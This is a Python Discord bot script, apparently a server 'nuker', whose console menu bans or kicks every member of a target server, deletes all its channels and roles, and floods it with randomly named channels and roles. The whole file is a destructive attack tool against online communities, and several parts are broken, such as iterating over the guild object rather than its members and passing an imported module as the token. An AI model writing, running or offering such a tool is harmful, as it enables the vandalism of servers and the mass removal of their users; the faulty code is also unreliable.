import discord, sys, random, string, os, time, asyncio
from . import bot_token
from discord.ext import commands
from discord.utils import get
from colorama import Fore

os.system("cls")

intents = discord.Intents.all()
client = commands.Bot(command_prefix = '.')


async def ban_all(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for member in guild:
        await member.ban(reason=None)


async def kick_all(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for member in guild:
        await member.kick(reason=None)


async def create_channels(guild_id, amount):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for _ in range(amount):
        overwrites = {guild.default_role: discord.PermissionOverwrite(read_messages= True)}
        await guild.create_text_channel(''.join(random.choice(string.ascii_lowercase) for i in range(17)), overwrites=overwrites)


async def delete_channels(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for channel in guild.channels:
        await channel.delete()


async def create_roles(guild_id, amount):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for _ in range(amount):
        await guild.create_role(name=''.join(random.choice(string.ascii_lowercase) for i in range(10)))


async def delete_roles(guild_id):
    guild = discord.utils.get(client.guilds, id=guild_id)
    if guild == None:
        print("Please invite me to the server. Or the server id is incorrect.")
        return

    for role in guild.roles:
        await role.delete()

@client.event
async def on_ready():
    print("Bot is ready!\n\n")
    while True:
        print("[CONSOLE] [0] Exit.")
        print("[CONSOLE] [1] Ban all users.")
        print("[CONSOLE] [2] Kick all users.")
        print("[CONSOLE] [3] Mass channel create.")
        print("[CONSOLE] [4] Delete all channels.")
        print("[CONSOLE] [5] Mass role create.")
        print("[CONSOLE] [6] Delete all roles")
        try:
            option = int(input("\n: "))
        except:
            print(f"\n{Fore.RED}[ERROR] Choose a number between 0-6!")
            time.sleep(4)
            await client.logout()
            break

        if option == 0:
            await client.logout()
            break

        guild_target = int(input("\nServer target ID: "))

        if option == 1:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await ban_all(guild_target)
            print("Done!")

        elif option == 2:
            os.system("cls")
            print("starting...")
            time.sleep(3)   
            await kick_all(guild_target)
            print("Done!")

        elif option == 3:
            am = int(input("Amount of channels to create (nums): "))
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await create_channels(guild_target, am)
            print("Done!")

        elif option == 4:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await delete_channels(guild_target)
            print("Done!")

        elif option == 5:
            am = int(input("Amount of roles to create (nums): "))
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await create_roles(guild_target, am)
            print("Done!")

        elif option == 6:
            os.system("cls")
            print("starting...")
            time.sleep(3)
            await delete_roles(guild_target)
            print("Done!")

        elif option == 7:
            sys.exit(0)

try:
    client.run(bot_token)
except discord.errors.LoginFailure:
    print(f"{Fore.RED}[ERROR] Bad Token!")
    sys.exit(0)